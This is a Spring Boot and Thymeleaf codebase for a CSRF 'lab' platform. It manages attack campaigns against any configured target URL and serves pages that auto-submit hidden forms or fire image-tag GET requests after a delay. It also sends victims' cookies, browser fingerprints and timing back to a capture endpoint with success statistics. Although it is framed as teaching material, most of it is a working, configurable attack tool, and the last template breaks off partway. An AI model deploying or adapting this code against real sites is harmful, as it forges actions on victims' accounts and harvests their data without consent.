```java
package com.lab.csrf;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

/**
 * CSRF Lab Controller - Educational Security Testing Platform
 * 
 * This application provides a flexible framework for demonstrating and
 * teaching Cross-Site Request Forgery (CSRF) attacks in a controlled
 * lab environment.
 * 
 * WARNING: This tool is designed ONLY for authorized security testing
 * and education in controlled environments. Unauthorized use against
 * systems you don't own or have permission to test is illegal.
 * 
 * Key Features:
 * - Multiple attack campaign management
 * - Flexible payload generation (GET, POST, JSON, multipart)
 * - Data exfiltration tracking
 * - Auto-submit and delayed execution options
 * - Request/response capture for analysis
 * 
 * @author Security Training Team
 * @version 2.0
 */
@SpringBootApplication
public class CsrfLabController {
    public static void main(String[] args) {
        SpringApplication.run(CsrfLabController.class, args);
    }
    
    /**
     * Configure CORS to allow cross-origin requests for lab scenarios.
     * In production systems, CORS should be restrictive!
     */
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/**")
                    .allowedOrigins("*")
                    .allowedMethods("GET", "POST", "PUT", "DELETE");
            }
        };
    }
}
```

```java
package com.lab.csrf.controller;

import com.lab.csrf.model.*;
import com.lab.csrf.service.CampaignService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;

import java.util.*;

/**
 * Main controller for CSRF payload generation and capture management.
 * 
 * This controller handles:
 * 1. Campaign creation and management
 * 2. Dynamic payload generation based on attack parameters
 * 3. Data capture from successful CSRF attacks
 * 4. Reporting and analysis interfaces
 */
@Controller
@RequestMapping("/")
public class PayloadController {
    
    @Autowired
    private CampaignService campaignService;
    
    /**
     * Dashboard - Shows all active campaigns and statistics
     * 
     * Educational Note: This would be the "command and control" interface
     * that an attacker would use to manage multiple CSRF campaigns.
     */
    @GetMapping("/")
    public String dashboard(Model model) {
        model.addAttribute("campaigns", 
            campaignService.getAllCampaigns());
        model.addAttribute("stats", 
            campaignService.getGlobalStatistics());
        return "dashboard";
    }
    
    /**
     * Create a new CSRF campaign
     * 
     * @param request Campaign configuration including target URL,
     *                method, parameters, and behavior options
     * @return Campaign ID for tracking
     */
    @PostMapping("/api/campaign")
    @ResponseBody
    public ResponseEntity<Map<String, Object>> createCampaign(
            @RequestBody CampaignRequest request) {
        
        Campaign campaign = campaignService.createCampaign(request);
        
        return ResponseEntity.ok(Map.of(
            "campaignId", campaign.getId(),
            "payloadUrl", "/payload/" + campaign.getId(),
            "captureUrl", "/capture/" + campaign.getId()
        ));
    }
    
    /**
     * Serve the CSRF payload page
     * 
     * This endpoint generates an HTML page that will execute the CSRF
     * attack when visited. The page can be customized with various
     * options for educational demonstrations.
     * 
     * Educational Notes:
     * - Demonstrates how attackers hide malicious forms
     * - Shows auto-submission techniques
     * - Illustrates data exfiltration attempts
     * 
     * @param campaignId Unique identifier for the campaign
     * @param options Query parameters for customization (optional)
     */
    @GetMapping("/payload/{campaignId}")
    public String servePayload(
            @PathVariable String campaignId,
            @RequestParam(required = false) Map<String, String> options,
            Model model) {
        
        Campaign campaign = campaignService.getCampaign(campaignId)
            .orElseThrow(() -> 
                new IllegalArgumentException("Campaign not found"));
        
        // Track that payload was served
        campaignService.recordPayloadServed(campaignId);
        
        // Prepare model for template rendering
        model.addAttribute("campaign", campaign);
        model.addAttribute("config", campaign.getConfig());
        model.addAttribute("delayMs", 
            options.getOrDefault("delay", "0"));
        model.addAttribute("customMessage", 
            options.getOrDefault("message", "Loading..."));
        
        // Choose appropriate template based on attack method
        return selectTemplate(campaign.getConfig().getMethod());
    }
    
    /**
     * Capture data exfiltrated from successful CSRF attacks
     * 
     * This endpoint receives data sent back from the payload page.
     * Note: Due to Same-Origin Policy, actual response data may not
     * be accessible, but metadata like timing and user agent can be.
     * 
     * @param campaignId Campaign identifier
     * @param data Captured information from the victim's browser
     */
    @PostMapping("/capture/{campaignId}")
    @ResponseBody
    public ResponseEntity<Map<String, String>> captureData(
            @PathVariable String campaignId,
            @RequestBody CaptureData data,
            @RequestHeader(value = "User-Agent", required = false) 
                String userAgent,
            @RequestHeader(value = "Referer", required = false) 
                String referer) {
        
        // Enrich capture data with server-side information
        data.setUserAgent(userAgent);
        data.setReferer(referer);
        data.setServerTimestamp(System.currentTimeMillis());
        
        campaignService.recordCapture(campaignId, data);
        
        return ResponseEntity.ok(Map.of(
            "status", "captured",
            "campaignId", campaignId
        ));
    }
    
    /**
     * View all captured data for a specific campaign
     * 
     * Educational Use: Show students what data an attacker can
     * collect and how it can be analyzed.
     */
    @GetMapping("/captures/{campaignId}")
    public String viewCaptures(
            @PathVariable String campaignId,
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "50") int size,
            Model model) {
        
        Campaign campaign = campaignService.getCampaign(campaignId)
            .orElseThrow(() -> 
                new IllegalArgumentException("Campaign not found"));
        
        model.addAttribute("campaign", campaign);
        model.addAttribute("captures", 
            campaignService.getCaptures(campaignId, page, size));
        model.addAttribute("statistics", 
            campaignService.getCampaignStatistics(campaignId));
        
        return "captures";
    }
    
    /**
     * Generate a test page to demonstrate CSRF protection mechanisms
     * 
     * This creates a "vulnerable" form that students can attack,
     * showing both vulnerable and protected versions side-by-side.
     */
    @GetMapping("/test-target")
    public String testTarget(
            @RequestParam(defaultValue = "false") boolean protected_,
            Model model) {
        
        model.addAttribute("protected", protected_);
        model.addAttribute("csrfToken", 
            protected_ ? generateToken() : null);
        
        return "test-target";
    }
    
    /**
     * Export campaign data for analysis
     * 
     * Useful for creating reports or importing into analysis tools.
     */
    @GetMapping("/api/campaign/{campaignId}/export")
    @ResponseBody
    public ResponseEntity<CampaignExport> exportCampaign(
            @PathVariable String campaignId,
            @RequestParam(defaultValue = "json") String format) {
        
        CampaignExport export = 
            campaignService.exportCampaign(campaignId, format);
        
        return ResponseEntity.ok()
            .header("Content-Disposition", 
                "attachment; filename=campaign-" + campaignId + 
                "." + format)
            .body(export);
    }
    
    // Helper methods
    
    /**
     * Select appropriate template based on HTTP method
     * Different HTTP methods require different HTML/JavaScript approaches
     */
    private String selectTemplate(String method) {
        return switch (method.toUpperCase()) {
            case "GET" -> "payload-get";
            case "POST" -> "payload-post";
            case "PUT", "DELETE" -> "payload-xhr";
            case "JSON" -> "payload-json";
            default -> "payload-post";
        };
    }
    
    /**
     * Generate a sample CSRF token for demonstration purposes
     * In real applications, tokens should be cryptographically secure
     */
    private String generateToken() {
        return UUID.randomUUID().toString();
    }
}
```

```java
package com.lab.csrf.model;

import java.util.*;

/**
 * Represents a CSRF attack campaign configuration
 * 
 * A campaign defines:
 * - Target URL and HTTP method
 * - Parameters to send
 * - Behavioral options (auto-submit, delays, etc.)
 * - Tracking metadata
 */
public class Campaign {
    private String id;
    private String name;
    private String description;
    private CampaignConfig config;
    private CampaignMetadata metadata;
    private long createdAt;
    
    public Campaign() {
        this.id = UUID.randomUUID().toString();
        this.createdAt = System.currentTimeMillis();
        this.metadata = new CampaignMetadata();
    }
    
    // Getters and setters
    public String getId() { return id; }
    public void setId(String id) { this.id = id; }
    
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    
    public String getDescription() { return description; }
    public void setDescription(String description) { 
        this.description = description; 
    }
    
    public CampaignConfig getConfig() { return config; }
    public void setConfig(CampaignConfig config) { 
        this.config = config; 
    }
    
    public CampaignMetadata getMetadata() { return metadata; }
    public void setMetadata(CampaignMetadata metadata) { 
        this.metadata = metadata; 
    }
    
    public long getCreatedAt() { return createdAt; }
}

/**
 * Technical configuration for how the CSRF attack should be executed
 */
class CampaignConfig {
    private String targetUrl;
    private String method;  // GET, POST, PUT, DELETE, JSON
    private Map<String, String> parameters;
    private Map<String, String> headers;
    private PayloadOptions options;
    
    public CampaignConfig() {
        this.parameters = new HashMap<>();
        this.headers = new HashMap<>();
        this.options = new PayloadOptions();
    }
    
    // Getters and setters
    public String getTargetUrl() { return targetUrl; }
    public void setTargetUrl(String targetUrl) { 
        this.targetUrl = targetUrl; 
    }
    
    public String getMethod() { return method; }
    public void setMethod(String method) { this.method = method; }
    
    public Map<String, String> getParameters() { return parameters; }
    public void setParameters(Map<String, String> parameters) { 
        this.parameters = parameters; 
    }
    
    public Map<String, String> getHeaders() { return headers; }
    public void setHeaders(Map<String, String> headers) { 
        this.headers = headers; 
    }
    
    public PayloadOptions getOptions() { return options; }
    public void setOptions(PayloadOptions options) { 
        this.options = options; 
    }
}

/**
 * Behavioral options for the payload
 * 
 * These control how the attack executes in the victim's browser:
 * - autoSubmit: Automatically trigger the request
 * - delayMs: Wait before executing (to appear more legitimate)
 * - exfiltrate: Attempt to send back success indicators
 * - invisibleForm: Hide the form from the user
 * - redirectAfter: URL to redirect to after attack
 */
class PayloadOptions {
    private boolean autoSubmit = true;
    private int delayMs = 0;
    private boolean exfiltrate = true;
    private boolean invisibleForm = true;
    private String redirectAfter = null;
    private boolean includeMetadata = true;
    
    // Getters and setters
    public boolean isAutoSubmit() { return autoSubmit; }
    public void setAutoSubmit(boolean autoSubmit) { 
        this.autoSubmit = autoSubmit; 
    }
    
    public int getDelayMs() { return delayMs; }
    public void setDelayMs(int delayMs) { this.delayMs = delayMs; }
    
    public boolean isExfiltrate() { return exfiltrate; }
    public void setExfiltrate(boolean exfiltrate) { 
        this.exfiltrate = exfiltrate; 
    }
    
    public boolean isInvisibleForm() { return invisibleForm; }
    public void setInvisibleForm(boolean invisibleForm) { 
        this.invisibleForm = invisibleForm; 
    }
    
    public String getRedirectAfter() { return redirectAfter; }
    public void setRedirectAfter(String redirectAfter) { 
        this.redirectAfter = redirectAfter; 
    }
    
    public boolean isIncludeMetadata() { return includeMetadata; }
    public void setIncludeMetadata(boolean includeMetadata) { 
        this.includeMetadata = includeMetadata; 
    }
}

/**
 * Campaign tracking metadata
 * Tracks how many times the payload was served and data captured
 */
class CampaignMetadata {
    private int payloadServedCount = 0;
    private int captureCount = 0;
    private long lastActivity = 0;
    
    public void incrementPayloadServed() {
        payloadServedCount++;
        lastActivity = System.currentTimeMillis();
    }
    
    public void incrementCapture() {
        captureCount++;
        lastActivity = System.currentTimeMillis();
    }
    
    public int getPayloadServedCount() { return payloadServedCount; }
    public int getCaptureCount() { return captureCount; }
    public long getLastActivity() { return lastActivity; }
}
```

```java
package com.lab.csrf.model;

import java.util.*;

/**
 * Represents data captured from a victim's browser
 * 
 * This includes:
 * - Browser metadata (user agent, language, screen resolution)
 * - Timing information
 * - Cookies (if accessible)
 * - Custom data from the payload
 * 
 * Privacy Note: In educational settings, ensure students understand
 * the privacy implications of collecting such data.
 */
public class CaptureData {
    private String userAgent;
    private String referer;
    private long clientTimestamp;
    private long serverTimestamp;
    private String cookies;
    private Map<String, Object> customData;
    private BrowserMetadata browserMetadata;
    
    public CaptureData() {
        this.customData = new HashMap<>();
        this.browserMetadata = new BrowserMetadata();
    }
    
    // Getters and setters
    public String getUserAgent() { return userAgent; }
    public void setUserAgent(String userAgent) { 
        this.userAgent = userAgent; 
    }
    
    public String getReferer() { return referer; }
    public void setReferer(String referer) { this.referer = referer; }
    
    public long getClientTimestamp() { return clientTimestamp; }
    public void setClientTimestamp(long clientTimestamp) { 
        this.clientTimestamp = clientTimestamp; 
    }
    
    public long getServerTimestamp() { return serverTimestamp; }
    public void setServerTimestamp(long serverTimestamp) { 
        this.serverTimestamp = serverTimestamp; 
    }
    
    public String getCookies() { return cookies; }
    public void setCookies(String cookies) { this.cookies = cookies; }
    
    public Map<String, Object> getCustomData() { return customData; }
    public void setCustomData(Map<String, Object> customData) { 
        this.customData = customData; 
    }
    
    public BrowserMetadata getBrowserMetadata() { 
        return browserMetadata; 
    }
    public void setBrowserMetadata(BrowserMetadata browserMetadata) { 
        this.browserMetadata = browserMetadata; 
    }
}

/**
 * Browser metadata extracted from JavaScript
 * Useful for fingerprinting and understanding the victim's environment
 */
class BrowserMetadata {
    private String language;
    private String platform;
    private String screenResolution;
    private String timezone;
    private boolean cookiesEnabled;
    private boolean doNotTrack;
    
    // Getters and setters
    public String getLanguage() { return language; }
    public void setLanguage(String language) { 
        this.language = language; 
    }
    
    public String getPlatform() { return platform; }
    public void setPlatform(String platform) { 
        this.platform = platform; 
    }
    
    public String getScreenResolution() { return screenResolution; }
    public void setScreenResolution(String screenResolution) { 
        this.screenResolution = screenResolution; 
    }
    
    public String getTimezone() { return timezone; }
    public void setTimezone(String timezone) { 
        this.timezone = timezone; 
    }
    
    public boolean isCookiesEnabled() { return cookiesEnabled; }
    public void setCookiesEnabled(boolean cookiesEnabled) { 
        this.cookiesEnabled = cookiesEnabled; 
    }
    
    public boolean isDoNotTrack() { return doNotTrack; }
    public void setDoNotTrack(boolean doNotTrack) { 
        this.doNotTrack = doNotTrack; 
    }
}
```

```java
package com.lab.csrf.model;

import java.util.Map;

/**
 * Request object for creating a new campaign
 */
public class CampaignRequest {
    private String name;
    private String description;
    private String targetUrl;
    private String method;
    private Map<String, String> parameters;
    private Map<String, String> headers;
    private PayloadOptions options;
    
    // Getters and setters
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    
    public String getDescription() { return description; }
    public void setDescription(String description) { 
        this.description = description; 
    }
    
    public String getTargetUrl() { return targetUrl; }
    public void setTargetUrl(String targetUrl) { 
        this.targetUrl = targetUrl; 
    }
    
    public String getMethod() { return method; }
    public void setMethod(String method) { this.method = method; }
    
    public Map<String, String> getParameters() { return parameters; }
    public void setParameters(Map<String, String> parameters) { 
        this.parameters = parameters; 
    }
    
    public Map<String, String> getHeaders() { return headers; }
    public void setHeaders(Map<String, String> headers) { 
        this.headers = headers; 
    }
    
    public PayloadOptions getOptions() { return options; }
    public void setOptions(PayloadOptions options) { 
        this.options = options; 
    }
}

/**
 * Export format for campaign data
 */
public class CampaignExport {
    private Campaign campaign;
    private java.util.List<CaptureData> captures;
    private Map<String, Object> statistics;
    private long exportedAt;
    
    public CampaignExport() {
        this.exportedAt = System.currentTimeMillis();
    }
    
    // Getters and setters
    public Campaign getCampaign() { return campaign; }
    public void setCampaign(Campaign campaign) { 
        this.campaign = campaign; 
    }
    
    public java.util.List<CaptureData> getCaptures() { 
        return captures; 
    }
    public void setCaptures(java.util.List<CaptureData> captures) { 
        this.captures = captures; 
    }
    
    public Map<String, Object> getStatistics() { return statistics; }
    public void setStatistics(Map<String, Object> statistics) { 
        this.statistics = statistics; 
    }
    
    public long getExportedAt() { return exportedAt; }
}
```

```java
package com.lab.csrf.service;

import com.lab.csrf.model.*;
import org.springframework.stereotype.Service;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

/**
 * Service layer for managing CSRF campaigns
 * 
 * This service handles:
 * - Campaign lifecycle management (create, read, update, delete)
 * - Data capture storage and retrieval
 * - Statistics calculation
 * - Data export
 * 
 * Thread Safety: Uses ConcurrentHashMap for thread-safe operations
 * in a multi-user environment.
 */
@Service
public class CampaignService {
    
    // In-memory storage (for production, use a database)
    private final Map<String, Campaign> campaigns = 
        new ConcurrentHashMap<>();
    private final Map<String, List<CaptureData>> captures = 
        new ConcurrentHashMap<>();
    
    /**
     * Create a new campaign from a request
     * 
     * @param request Campaign configuration
     * @return Created campaign with generated ID
     */
    public Campaign createCampaign(CampaignRequest request) {
        Campaign campaign = new Campaign();
        campaign.setName(request.getName());
        campaign.setDescription(request.getDescription());
        
        CampaignConfig config = new CampaignConfig();
        config.setTargetUrl(request.getTargetUrl());
        config.setMethod(request.getMethod());
        config.setParameters(
            request.getParameters() != null ? 
            request.getParameters() : new HashMap<>());
        config.setHeaders(
            request.getHeaders() != null ? 
            request.getHeaders() : new HashMap<>());
        config.setOptions(
            request.getOptions() != null ? 
            request.getOptions() : new PayloadOptions());
        
        campaign.setConfig(config);
        
        campaigns.put(campaign.getId(), campaign);
        captures.put(campaign.getId(), 
            Collections.synchronizedList(new ArrayList<>()));
        
        return campaign;
    }
    
    /**
     * Retrieve a campaign by ID
     */
    public Optional<Campaign> getCampaign(String campaignId) {
        return Optional.ofNullable(campaigns.get(campaignId));
    }
    
    /**
     * Get all campaigns
     */
    public List<Campaign> getAllCampaigns() {
        return new ArrayList<>(campaigns.values());
    }
    
    /**
     * Record that a payload was served to a victim
     * 
     * Educational Note: This tracks the "reach" of the attack
     */
    public void recordPayloadServed(String campaignId) {
        Campaign campaign = campaigns.get(campaignId);
        if (campaign != null) {
            campaign.getMetadata().incrementPayloadServed();
        }
    }
    
    /**
     * Record captured data from a successful attack
     * 
     * @param campaignId Campaign identifier
     * @param data Captured information
     */
    public void recordCapture(String campaignId, CaptureData data) {
        List<CaptureData> campaignCaptures = 
            captures.get(campaignId);
        if (campaignCaptures != null) {
            campaignCaptures.add(data);
            
            Campaign campaign = campaigns.get(campaignId);
            if (campaign != null) {
                campaign.getMetadata().incrementCapture();
            }
        }
    }
    
    /**
     * Retrieve captured data with pagination
     * 
     * @param campaignId Campaign identifier
     * @param page Page number (0-indexed)
     * @param size Items per page
     * @return Paginated list of captures
     */
    public List<CaptureData> getCaptures(
            String campaignId, int page, int size) {
        List<CaptureData> allCaptures = 
            captures.getOrDefault(campaignId, new ArrayList<>());
        
        int start = page * size;
        int end = Math.min(start + size, allCaptures.size());
        
        if (start >= allCaptures.size()) {
            return new ArrayList<>();
        }
        
        return new ArrayList<>(allCaptures.subList(start, end));
    }
    
    /**
     * Calculate statistics for a specific campaign
     * 
     * Statistics include:
     * - Total payloads served
     * - Total captures
     * - Success rate (captures / payloads served)
     * - Browser distribution
     * - Time-based analysis
     */
    public Map<String, Object> getCampaignStatistics(
            String campaignId) {
        Campaign campaign = campaigns.get(campaignId);
        List<CaptureData> campaignCaptures = 
            captures.getOrDefault(campaignId, new ArrayList<>());
        
        if (campaign == null) {
            return Map.of();
        }
        
        Map<String, Object> stats = new HashMap<>();
        CampaignMetadata metadata = campaign.getMetadata();
        
        stats.put("payloadServedCount", 
            metadata.getPayloadServedCount());
        stats.put("captureCount", metadata.getCaptureCount());
        
        // Calculate success rate
        double successRate = metadata.getPayloadServedCount() > 0 ?
            (double) metadata.getCaptureCount() / 
            metadata.getPayloadServedCount() * 100 : 0;
        stats.put("successRate", 
            String.format("%.2f%%", successRate));
        
        // Browser distribution
        Map<String, Long> browserDist = campaignCaptures.stream()
            .map(CaptureData::getUserAgent)
            .filter(Objects::nonNull)
            .collect(Collectors.groupingBy(
                this::extractBrowserName, 
                Collectors.counting()));
        stats.put("browserDistribution", browserDist);
        
        // Time analysis
        if (!campaignCaptures.isEmpty()) {
            long firstCapture = campaignCaptures.stream()
                .mapToLong(CaptureData::getServerTimestamp)
                .min().orElse(0);
            long lastCapture = campaignCaptures.stream()
                .mapToLong(CaptureData::getServerTimestamp)
                .max().orElse(0);
            
            stats.put("firstCapture", new Date(firstCapture));
            stats.put("lastCapture", new Date(lastCapture));
            stats.put("campaignDuration", 
                lastCapture - firstCapture);
        }
        
        return stats;
    }
    
    /**
     * Get global statistics across all campaigns
     */
    public Map<String, Object> getGlobalStatistics() {
        Map<String, Object> stats = new HashMap<>();
        
        stats.put("totalCampaigns", campaigns.size());
        stats.put("activeCampaigns", campaigns.values().stream()
            .filter(c -> c.getMetadata().getLastActivity() > 
                System.currentTimeMillis() - 24 * 60 * 60 * 1000)
            .count());
        
        int totalPayloadsServed = campaigns.values().stream()
            .mapToInt(c -> 
                c.getMetadata().getPayloadServedCount())
            .sum();
        stats.put("totalPayloadsServed", totalPayloadsServed);
        
        int totalCaptures = campaigns.values().stream()
            .mapToInt(c -> c.getMetadata().getCaptureCount())
            .sum();
        stats.put("totalCaptures", totalCaptures);
        
        return stats;
    }
    
    /**
     * Export campaign data for analysis
     * 
     * @param campaignId Campaign to export
     * @param format Export format (json, csv, xml)
     * @return Export object with all campaign data
     */
    public CampaignExport exportCampaign(
            String campaignId, String format) {
        Campaign campaign = campaigns.get(campaignId);
        List<CaptureData> campaignCaptures = 
            captures.getOrDefault(campaignId, new ArrayList<>());
        
        CampaignExport export = new CampaignExport();
        export.setCampaign(campaign);
        export.setCaptures(new ArrayList<>(campaignCaptures));
        export.setStatistics(getCampaignStatistics(campaignId));
        
        return export;
    }
    
    /**
     * Delete a campaign and all associated data
     * 
     * Educational Note: In a real attack scenario, attackers might
     * delete evidence. In labs, discuss data retention policies.
     */
    public boolean deleteCampaign(String campaignId) {
        Campaign removed = campaigns.remove(campaignId);
        captures.remove(campaignId);
        return removed != null;
    }
    
    // Helper methods
    
    /**
     * Extract browser name from user agent string
     * This is a simplified version for demonstration
     */
    private String extractBrowserName(String userAgent) {
        if (userAgent == null) return "Unknown";
        
        userAgent = userAgent.toLowerCase();
        if (userAgent.contains("edg/")) return "Edge";
        if (userAgent.contains("chrome")) return "Chrome";
        if (userAgent.contains("firefox")) return "Firefox";
        if (userAgent.contains("safari")) return "Safari";
        if (userAgent.contains("opera")) return "Opera";
        
        return "Other";
    }
}
```

Now for the Thymeleaf templates with extensive documentation:

```html
<!-- src/main/resources/templates/payload-post.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title th:text="${campaign.config.options.invisibleForm ? 
        'Loading...' : 'Please wait'}">Loading...</title>
    <style>
        /*
         * Styling to make the form invisible or visible based on
         * configuration. In real attacks, forms are typically hidden.
         */
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        
        .loading {
            font-size: 18px;
            color: #666;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #csrfForm {
            display: none; /* Hidden by default */
        }
        
        /* Show form if configured to be visible (for demos) */
        .visible-form #csrfForm {
            display: block;
            max-width: 500px;
            margin: 20px auto;
            padding: 20px;
            border: 1px solid #ddd;
            background: #f9f9f9;
        }
    </style>
</head>
<body th:class="${campaign.config.options.invisibleForm ? 
    '' : 'visible-form'}">
    
    <!--
        Educational Note: This message is what the victim sees.
        Attackers often use convincing messages like "Redirecting..."
        or "Processing your request..."
    -->
    <div class="loading">
        <div class="spinner"></div>
        <p th:text="${customMessage}">Please wait...</p>
    </div>
    
    <!--
        The CSRF Form
        
        This form will be auto-submitted via JavaScript.
        Key points to teach:
        - Forms can be submitted without user interaction
        - Hidden inputs carry the attack payload
        - The browser automatically includes cookies for the target
        - Same-Origin Policy doesn't prevent the REQUEST, only reading
          the RESPONSE
    -->
    <form id="csrfForm" 
          th:action="${campaign.config.targetUrl}" 
          th:method="${campaign.config.method}"
          th:if="${campaign.config.method == 'POST'}">
        
        <!-- 
            Iterate through all parameters configured for this campaign
            Each becomes a hidden input field
        -->
        <input th:each="entry : ${campaign.config.parameters}" 
               type="hidden" 
               th:name="${entry.key}" 
               th:value="${entry.value}"/>
        
        <!-- Visible submit button only if form is configured visible -->
        <button type="submit" 
                th:if="${!campaign.config.options.invisibleForm}">
            Submit Request
        </button>
    </form>
    
    <script th:inline="javascript">
        /*<![CDATA[*/
        
        /**
         * CSRF Payload Execution Script
         * 
         * This script handles:
         * 1. Auto-submission of the form (if configured)
         * 2. Delayed execution (to appear more legitimate)
         * 3. Browser metadata collection
         * 4. Data exfiltration back to the controller
         * 5. Optional redirect after execution
         * 
         * Educational Points:
         * - JavaScript can manipulate forms invisibly
         * - Timing attacks can bypass some protections
         * - Metadata reveals information about the victim
         * - Exfiltration has limitations due to SOP
         */
        
        // Configuration from server
        const config = {
            campaignId: /*[[${campaign.id}]]*/ '',
            autoSubmit: /*[[${campaign.config.options.autoSubmit}]]*/ true,
            delayMs: /*[[${campaign.config.options.delayMs}]]*/ 0,
            exfiltrate: /*[[${campaign.config.options.exfiltrate}]]*/ true,
            redirectAfter: /*[[${campaign.config.options.redirectAfter}]]*/ null,
            includeMetadata: /*[[${campaign.config.options.includeMetadata}]]*/ true
        };
        
        const form = document.getElementById('csrfForm');
        
        /**
         * Collect browser metadata for fingerprinting
         * 
         * Educational Note: This shows what information is available
         * to JavaScript and can be collected without user consent
         */
        function collectMetadata() {
            if (!config.includeMetadata) return {};
            
            return {
                // Browser information
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                
                // Screen information
                screenResolution: `${screen.width}x${screen.height}`,
                screenColorDepth: screen.colorDepth,
                
                // Window information
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                
                // Privacy indicators
                doNotTrack: navigator.doNotTrack,
                cookiesEnabled: navigator.cookieEnabled,
                
                // Timing
                clientTimestamp: Date.now(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Cookies (may be limited by Same-Origin Policy)
                cookies: document.cookie || 'none',
                
                // Referrer information
                referrer: document.referrer || 'direct'
            };
        }
        
        /**
         * Attempt to exfiltrate data back to the controller
         * 
         * Educational Note: This demonstrates the attacker's attempt
         * to confirm success. Due to SOP, the actual response from
         * the target cannot be read, but timing and metadata can be.
         */
        async function exfiltrate(metadata) {
            if (!config.exfiltrate) return;
            
            try {
                // Send collected data to capture endpoint
                const response = await fetch(
                    `/capture/${config.campaignId}`, 
                    {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(metadata)
                    }
                );
                
                console.log('Data exfiltrated successfully');
            } catch (error) {
                // Exfiltration may fail due to network or SOP
                console.error('Exfiltration failed:', error);
            }
        }
        
        /**
         * Execute the CSRF attack
         * 
         * Flow:
         * 1. Wait for configured delay
         * 2. Collect metadata (if enabled)
         * 3. Submit the form
         * 4. Exfiltrate data (if enabled)
         * 5. Redirect (if configured)
         */
        async function execute() {
            // Collect metadata before submission
            const metadata = collectMetadata();
            
            // Submit the form
            if (config.autoSubmit) {
                console.log('Auto-submitting CSRF form');
                form.submit();
                
                // Note: Code after submit() may not execute if page
                // redirects. Exfiltration should happen quickly.
                
                // Attempt exfiltration after a short delay
                setTimeout(async () => {
                    metadata.formSubmitted = true;
                    metadata.submittedAt = Date.now();
                    await exfiltrate(metadata);
                    
                    // Redirect if configured
                    if (config.redirectAfter) {
                        window.location.href = config.redirectAfter;
                    }
                }, 500);
            }
        }
        
        /**
         * Initialize and execute attack after delay
         * 
         * Educational Note: Delays can help bypass detection systems
         * that look for immediate automated actions
         */
        if (config.delayMs > 0) {
            console.log(`Waiting ${config.delayMs}ms before execution`);
            setTimeout(execute, config.delayMs);
        } else {
            // Execute immediately on page load
            execute();
        }
        
        /*]]>*/
    </script>
</body>
</html>
```

```html
<!-- src/main/resources/templates/payload-get.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
    </style>
</head>
<body>
    <!--
        GET-based CSRF Attack
        
        Educational Note: GET requests are simpler for CSRF because
        they can be triggered just by loading an image or iframe:
        
        <img src="http://target.com/transfer?to=attacker&amount=1000">
        <iframe src="http://target.com/delete?id=123"></iframe>
        
        This is why sensitive actions should NEVER use GET requests!
    -->
    
    <div class="loading">
        <p th:text="${customMessage}">Redirecting...</p>
    </div>
    
    <script th:inline="javascript">
        /*<![CDATA[*/
        
        const config = {
            campaignId: /*[[${campaign.id}]]*/ '',
            targetUrl: /*[[${campaign.config.targetUrl}]]*/ '',
            parameters: /*[[${campaign.config.parameters}]]*/ {},
            delayMs: /*[[${campaign.config.options.delayMs}]]*/ 0,
            exfiltrate: /*[[${campaign.config.options.exfiltrate}]]*/ true
        };
        
        /**
         * Build GET URL with query parameters
         */
        function buildGetUrl() {
            const url = new URL(config.targetUrl);
            Object.entries(config.parameters).forEach(([key, value]) => {
                url.searchParams.append(key, value);
            });
            return url.toString();
        }
        
        /**
         * Execute GET-based CSRF attack
         * 
         * Multiple techniques demonstrated:
         * 1. Direct navigation (most obvious)
         * 2. Image tag (stealthiest)
         * 3. Iframe (can check for success/failure)
         */
        async function execute() {
            const targetUrl = buildGetUrl();
            
            // Method 1: Direct navigation (redirects the page)
            // window.location.href = targetUrl;
            
            // Method 2: Image tag (invisible, no redirect)
            const img = new Image();
            img.src = targetUrl;
            
            // Method 3: Iframe (can inspect result with same-origin)
            // const iframe = document.createElement('iframe');
            // iframe.style.display = 'none';
            // iframe.src = targetUrl;
            // document.body.appendChild(iframe);
            
            // Exfiltrate metadata
            if (config.exfiltrate) {
                setTimeout(async () => {
                    await fetch(`/capture/${config.campaignId}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            method: 'GET',
                            targetUrl: targetUrl,
                            timestamp: Date.now(),
                            userAgent: navigator.userAgent
                        })
                    });
                }, 500);
            }
        }
        
        setTimeout(execute, config.delayMs);
        
        /*]]>*/
    </script>
</body>
</html>
```

```html
<!-- src/main/resources/templates/payload-json.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <!--
        JSON-based CSRF Attack using XHR/Fetch
        
        Educational Note: Modern applications often use JSON APIs.
        CSRF is still possible if:
        - The API doesn't validate Content-Type properly
        - CORS is misconfigured
        - The API accepts form-encoded data and auto-converts
        
        This demonstrates why CSRF tokens are crucial even for APIs!
    -->
    
    <div class="loading">
        <p th:text="${customMessage}">Processing...</p>
